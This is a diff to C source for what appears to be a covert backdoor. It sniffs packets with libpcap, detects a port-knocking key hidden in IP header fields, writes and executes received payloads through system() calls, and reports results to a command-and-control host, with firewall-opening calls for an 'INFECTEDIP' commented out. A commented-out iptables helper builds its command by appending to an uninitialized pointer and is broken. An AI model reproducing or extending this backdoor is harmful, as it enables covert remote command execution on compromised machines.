@@ -23,11 +23,24 @@ int main(int argc, char **argv){
     return 0;
 }
 
-int Packetcapture(){
+/*char* iptables(char *port, char *ip, char *protocol){
+    char *iptables;
+    strcat(iptables,IPTABLE);
+    strcat(iptables,protocol);
+    strcat(iptables,SOURCE);
+    strcat(iptables,ip);
+    strcat(iptables,DPORT);
+    strcat(iptables,port);
+    strcat(iptables,ACCEPT);
+    system(iptables);
+    printf("%s", iptables);
+}*/
+
+int Packetcapture(char *filter){
     char errorbuffer[PCAP_ERRBUF_SIZE];
     struct bpf_program fp; //holds fp program info
     pcap_if_t *interface_list;
-    bpf_u_int32 netp; //holds the ip
+    bpf_u_int32 netp  = 0; //holds the ip
 
     //find the first network device capable of packet capture
     if(pcap_findalldevs(&interface_list,errorbuffer) == -1){
@@ -42,7 +55,7 @@ int Packetcapture(){
         exit(0);
     }
 
-    if(pcap_compile(interfaceinfo, &fp, FILTER, 0, netp) == -1){
+    if(pcap_compile(interfaceinfo, &fp, filter, 0, netp) == -1){
         perror("pcap_comile");
     }
 
@@ -109,6 +122,7 @@ void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
 
 }
 
+
 bool CheckKey(u_char ip_tos, u_short ip_id, bool knock){
     if(knock){
         //check if the key is right for port knocking
@@ -162,7 +176,7 @@ void ParsePattern(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* 
         }
     }
     if((knocking[0] == 1) && (knocking[1] == 1)){
-        system(IPTABLES(INFECTEDIP));
+        //system(IPTABLES(INFECTEDIP));
         char *dip = INFECTEDIP;
         unsigned short sport = SHPORT;
         unsigned short dport = SHPORT;
@@ -230,7 +244,7 @@ void ParsePayload(const u_char *payload, int len){
     fclose(fp);
     system(CHMOD);
     system(CMD);
-    system(IPTABLES(INFECTEDIP));
+    //system(IPTABLES(INFECTEDIP));
 
 
     //sending the results back to the CNC
